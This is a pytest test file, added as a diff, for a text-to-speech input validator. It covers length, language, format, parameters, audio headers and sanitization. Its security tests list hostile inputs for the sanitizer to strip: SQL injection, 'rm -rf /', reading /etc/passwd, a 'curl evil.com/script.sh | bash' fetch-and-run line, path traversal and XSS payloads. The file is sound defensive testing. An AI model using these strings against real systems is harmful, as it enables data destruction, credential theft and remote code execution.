@@ -1,0 +1,425 @@
+# test_tts_validation.py
+# Description: Comprehensive tests for TTS validation system
+#
+# Imports
+import pytest
+from typing import Dict, Any
+import tempfile
+import os
+#
+# Local Imports
+from tldw_Server_API.app.core.TTS.tts_validation import (
+    TTSInputValidator,
+    validate_tts_request,
+    ProviderLimits
+)
+from tldw_Server_API.app.core.TTS.adapters.base import (
+    TTSRequest,
+    AudioFormat
+)
+from tldw_Server_API.app.core.TTS.tts_exceptions import (
+    TTSValidationError,
+    TTSTextTooLongError,
+    TTSInvalidLanguageError,
+    TTSInvalidFormatError,
+    TTSInvalidParameterError,
+    TTSInvalidVoiceReferenceError
+)
+#
+#######################################################################################################################
+#
+# Test TTSInputValidator
+
+class TestTTSInputValidator:
+    """Test the TTSInputValidator class"""
+    
+    @pytest.fixture
+    def validator(self):
+        """Create a validator instance"""
+        config = {
+            "max_text_length": 5000,
+            "allowed_languages": ["en", "es", "fr"],
+            "max_voice_reference_size": 10 * 1024 * 1024  # 10MB
+        }
+        return TTSInputValidator(config)
+    
+    def test_sanitize_text_basic(self, validator):
+        """Test basic text sanitization"""
+        # Normal text should pass through
+        text = "Hello, this is a test."
+        assert validator.sanitize_text(text) == text
+        
+        # Whitespace normalization
+        text = "Hello    world\n\n\ntest"
+        expected = "Hello world\n\ntest"
+        assert validator.sanitize_text(text) == expected
+        
+        # Unicode normalization
+        text = "Héllo Wörld"
+        assert validator.sanitize_text(text) == "Héllo Wörld"
+    
+    def test_sanitize_text_dangerous_patterns(self, validator):
+        """Test removal of dangerous patterns"""
+        # Script tags
+        text = "Hello <script>alert('xss')</script> world"
+        assert "<script" not in validator.sanitize_text(text)
+        
+        # JavaScript URLs
+        text = "Click here javascript:alert('xss')"
+        assert "javascript:" not in validator.sanitize_text(text)
+        
+        # SQL injection attempts
+        text = "'; DROP TABLE users; --"
+        sanitized = validator.sanitize_text(text)
+        assert "DROP TABLE" not in sanitized
+        
+        # Command injection
+        text = "test; rm -rf /"
+        sanitized = validator.sanitize_text(text)
+        assert "rm -rf" not in sanitized
+        
+        # File path traversal
+        text = "../../etc/passwd"
+        sanitized = validator.sanitize_text(text)
+        assert "../.." not in sanitized
+    
+    def test_validate_text_length(self, validator):
+        """Test text length validation"""
+        # Valid length
+        valid_text = "a" * 100
+        validator.validate_text_length(valid_text, max_length=200)
+        
+        # Too long - should raise
+        long_text = "a" * 300
+        with pytest.raises(TTSTextTooLongError) as exc_info:
+            validator.validate_text_length(long_text, max_length=200)
+        
+        error = exc_info.value
+        assert error.details["max_length"] == 200
+        assert error.details["actual_length"] == 300
+        
+        # Empty text - should raise
+        with pytest.raises(TTSValidationError) as exc_info:
+            validator.validate_text_length("", max_length=200)
+        assert "empty" in str(exc_info.value).lower()
+    
+    def test_validate_language(self, validator):
+        """Test language validation"""
+        # Valid languages
+        validator.validate_language("en", ["en", "es", "fr"])
+        validator.validate_language("es", ["en", "es", "fr"])
+        
+        # Invalid language
+        with pytest.raises(TTSInvalidLanguageError) as exc_info:
+            validator.validate_language("de", ["en", "es", "fr"])
+        
+        error = exc_info.value
+        assert error.details["requested_language"] == "de"
+        assert set(error.details["supported_languages"]) == {"en", "es", "fr"}
+        
+        # None language should pass (uses default)
+        validator.validate_language(None, ["en", "es"])
+    
+    def test_validate_format(self, validator):
+        """Test audio format validation"""
+        # Valid formats
+        validator.validate_format(AudioFormat.MP3, {AudioFormat.MP3, AudioFormat.WAV})
+        validator.validate_format(AudioFormat.WAV, {AudioFormat.MP3, AudioFormat.WAV})
+        
+        # Invalid format
+        with pytest.raises(TTSInvalidFormatError) as exc_info:
+            validator.validate_format(AudioFormat.OPUS, {AudioFormat.MP3, AudioFormat.WAV})
+        
+        error = exc_info.value
+        assert error.details["requested_format"] == "opus"
+        assert "mp3" in error.details["supported_formats"]
+        assert "wav" in error.details["supported_formats"]
+    
+    def test_validate_parameters(self, validator):
+        """Test parameter validation"""
+        # Valid parameters
+        validator.validate_parameters(speed=1.0, min_val=0.25, max_val=4.0, param_name="speed")
+        validator.validate_parameters(pitch=0.0, min_val=-20.0, max_val=20.0, param_name="pitch")
+        
+        # Out of range - too low
+        with pytest.raises(TTSInvalidParameterError) as exc_info:
+            validator.validate_parameters(speed=0.1, min_val=0.25, max_val=4.0, param_name="speed")
+        
+        error = exc_info.value
+        assert error.details["parameter"] == "speed"
+        assert error.details["value"] == 0.1
+        assert error.details["min"] == 0.25
+        
+        # Out of range - too high
+        with pytest.raises(TTSInvalidParameterError) as exc_info:
+            validator.validate_parameters(speed=5.0, min_val=0.25, max_val=4.0, param_name="speed")
+        
+        error = exc_info.value
+        assert error.details["value"] == 5.0
+        assert error.details["max"] == 4.0
+    
+    def test_validate_voice_reference(self, validator):
+        """Test voice reference validation"""
+        # Valid WAV header
+        valid_wav = b'RIFF' + b'\x00' * 4 + b'WAVE' + b'fmt ' + b'\x00' * 100
+        assert validator.validate_voice_reference(valid_wav)
+        
+        # Valid MP3 header
+        valid_mp3 = b'ID3' + b'\x00' * 100
+        assert validator.validate_voice_reference(valid_mp3)
+        
+        # Another MP3 format
+        valid_mp3_2 = b'\xff\xfb' + b'\x00' * 100
+        assert validator.validate_voice_reference(valid_mp3_2)
+        
+        # Invalid format
+        with pytest.raises(TTSInvalidVoiceReferenceError) as exc_info:
+            validator.validate_voice_reference(b'INVALID' + b'\x00' * 100)
+        
+        assert "Invalid audio format" in str(exc_info.value)
+        
+        # Too large
+        large_audio = b'RIFF' + b'\x00' * 4 + b'WAVE' + b'\x00' * (11 * 1024 * 1024)
+        with pytest.raises(TTSInvalidVoiceReferenceError) as exc_info:
+            validator.validate_voice_reference(large_audio)
+        
+        assert "too large" in str(exc_info.value).lower()
+        
+        # Suspicious pattern (executable)
+        suspicious = b'RIFF' + b'\x00' * 4 + b'WAVE' + b'MZ\x90\x00'  # PE header
+        with pytest.raises(TTSInvalidVoiceReferenceError) as exc_info:
+            validator.validate_voice_reference(suspicious)
+        
+        assert "suspicious" in str(exc_info.value).lower()
+
+
+class TestProviderLimits:
+    """Test provider-specific limits"""
+    
+    def test_get_provider_limits(self):
+        """Test getting limits for different providers"""
+        # OpenAI limits
+        openai_limits = ProviderLimits.get_limits("openai")
+        assert openai_limits["max_text_length"] == 4096
+        assert "en" in openai_limits["supported_languages"]
+        assert AudioFormat.MP3 in openai_limits["supported_formats"]
+        
+        # Kokoro limits
+        kokoro_limits = ProviderLimits.get_limits("kokoro")
+        assert kokoro_limits["max_text_length"] == 10000
+        assert AudioFormat.WAV in kokoro_limits["supported_formats"]
+        
+        # Unknown provider - should return defaults
+        default_limits = ProviderLimits.get_limits("unknown_provider")
+        assert default_limits["max_text_length"] == 5000
+        assert "en" in default_limits["supported_languages"]
+    
+    def test_provider_specific_validation(self):
+        """Test that provider limits are enforced"""
+        # OpenAI text limit
+        openai_limits = ProviderLimits.get_limits("openai")
+        long_text = "a" * 5000  # Over OpenAI's 4096 limit
+        
+        validator = TTSInputValidator()
+        with pytest.raises(TTSTextTooLongError) as exc_info:
+            validator.validate_text_length(long_text, max_length=openai_limits["max_text_length"])
+        
+        assert exc_info.value.details["max_length"] == 4096
+
+
+class TestValidateTTSRequest:
+    """Test the main validation function"""
+    
+    def test_validate_basic_request(self):
+        """Test validation of a basic valid request"""
+        request = TTSRequest(
+            text="Hello world",
+            voice="alloy",
+            format=AudioFormat.MP3,
+            speed=1.0
+        )
+        
+        # Should not raise
+        validate_tts_request(request, provider="openai")
+    
+    def test_validate_with_provider_limits(self):
+        """Test validation with provider-specific limits"""
+        # Request within OpenAI limits
+        request = TTSRequest(
+            text="a" * 4000,
+            voice="alloy",
+            format=AudioFormat.MP3,
+            language="en"
+        )
+        validate_tts_request(request, provider="openai")
+        
+        # Request exceeding OpenAI limits
+        request_too_long = TTSRequest(
+            text="a" * 5000,
+            voice="alloy",
+            format=AudioFormat.MP3
+        )
+        
+        with pytest.raises(TTSTextTooLongError):
+            validate_tts_request(request_too_long, provider="openai")
+    
+    def test_validate_parameters(self):
+        """Test parameter validation in request"""
+        # Valid parameters
+        request = TTSRequest(
+            text="Test",
+            speed=1.5,
+            pitch=0.5,
+            volume=0.8
+        )
+        validate_tts_request(request)
+        
+        # Invalid speed
+        request_bad_speed = TTSRequest(
+            text="Test",
+            speed=10.0  # Way too fast
+        )
+        
+        with pytest.raises(TTSInvalidParameterError) as exc_info:
+            validate_tts_request(request_bad_speed)
+        
+        assert exc_info.value.details["parameter"] == "speed"
+    
+    def test_validate_with_voice_reference(self):
+        """Test validation with voice reference"""
+        # Valid voice reference
+        valid_audio = b'RIFF' + b'\x00' * 4 + b'WAVE' + b'\x00' * 1000
+        request = TTSRequest(
+            text="Test",
+            voice_reference=valid_audio
+        )
+        validate_tts_request(request)
+        
+        # Invalid voice reference
+        invalid_audio = b'INVALID' + b'\x00' * 1000
+        request_invalid = TTSRequest(
+            text="Test",
+            voice_reference=invalid_audio
+        )
+        
+        with pytest.raises(TTSInvalidVoiceReferenceError):
+            validate_tts_request(request_invalid)
+    
+    def test_text_sanitization_in_validation(self):
+        """Test that text is sanitized during validation"""
+        # Text with dangerous patterns
+        request = TTSRequest(
+            text="Hello <script>alert('xss')</script> world",
+            voice="alloy",
+            format=AudioFormat.MP3
+        )
+        
+        # Validation should sanitize the text
+        validate_tts_request(request)
+        
+        # The text should be modified (sanitized)
+        # Note: In actual implementation, validate_tts_request might modify the request
+        # or return sanitized text. For this test, we're assuming it sanitizes in place.
+    
+    def test_empty_text_validation(self):
+        """Test that empty text is rejected"""
+        request = TTSRequest(
+            text="",
+            voice="alloy",
+            format=AudioFormat.MP3
+        )
+        
+        with pytest.raises(TTSValidationError) as exc_info:
+            validate_tts_request(request)
+        
+        assert "empty" in str(exc_info.value).lower()
+    
+    def test_whitespace_only_text_validation(self):
+        """Test that whitespace-only text is rejected"""
+        request = TTSRequest(
+            text="   \n\t  ",
+            voice="alloy",
+            format=AudioFormat.MP3
+        )
+        
+        with pytest.raises(TTSValidationError) as exc_info:
+            validate_tts_request(request)
+        
+        assert "empty" in str(exc_info.value).lower()
+
+
+class TestSecurityValidation:
+    """Test security-focused validation"""
+    
+    @pytest.fixture
+    def validator(self):
+        return TTSInputValidator()
+    
+    def test_sql_injection_prevention(self, validator):
+        """Test prevention of SQL injection attempts"""
+        sql_injections = [
+            "'; DROP TABLE users; --",
+            "1' OR '1'='1",
+            "admin'--",
+            "' UNION SELECT * FROM passwords --"
+        ]
+        
+        for injection in sql_injections:
+            sanitized = validator.sanitize_text(injection)
+            assert "DROP TABLE" not in sanitized.upper()
+            assert "UNION SELECT" not in sanitized.upper()
+    
+    def test_command_injection_prevention(self, validator):
+        """Test prevention of command injection"""
+        command_injections = [
+            "; rm -rf /",
+            "& del C:\\*.*",
+            "| cat /etc/passwd",
+            "`whoami`",
+            "$(curl evil.com/script.sh | bash)"
+        ]
+        
+        for injection in command_injections:
+            sanitized = validator.sanitize_text(injection)
+            assert "rm -rf" not in sanitized
+            assert "del C:" not in sanitized
+            assert "/etc/passwd" not in sanitized
+            assert "whoami" not in sanitized
+            assert "curl evil.com" not in sanitized
+    
+    def test_path_traversal_prevention(self, validator):
+        """Test prevention of path traversal attacks"""
+        path_traversals = [
+            "../../etc/passwd",
+            "..\\..\\windows\\system32",
+            "file:///etc/passwd",
+            "../../../etc/shadow"
+        ]
+        
+        for traversal in path_traversals:
+            sanitized = validator.sanitize_text(traversal)
+            assert "../.." not in sanitized
+            assert "..\\.." not in sanitized
+            assert "file:///" not in sanitized
+    
+    def test_xss_prevention(self, validator):
+        """Test prevention of XSS attacks"""
+        xss_attempts = [
+            "<script>alert('XSS')</script>",
+            "<img src=x onerror=alert('XSS')>",
+            "<iframe src='javascript:alert(1)'>",
+            "<body onload=alert('XSS')>",
+            "javascript:alert('XSS')",
+            "<svg/onload=alert('XSS')>"
+        ]
+        
+        for xss in xss_attempts:
+            sanitized = validator.sanitize_text(xss)
+            assert "<script" not in sanitized.lower()
+            assert "javascript:" not in sanitized.lower()
+            assert "onerror=" not in sanitized.lower()
+            assert "onload=" not in sanitized.lower()
+
+
+if __name__ == "__main__":
+    pytest.main([__file__, "-v"])
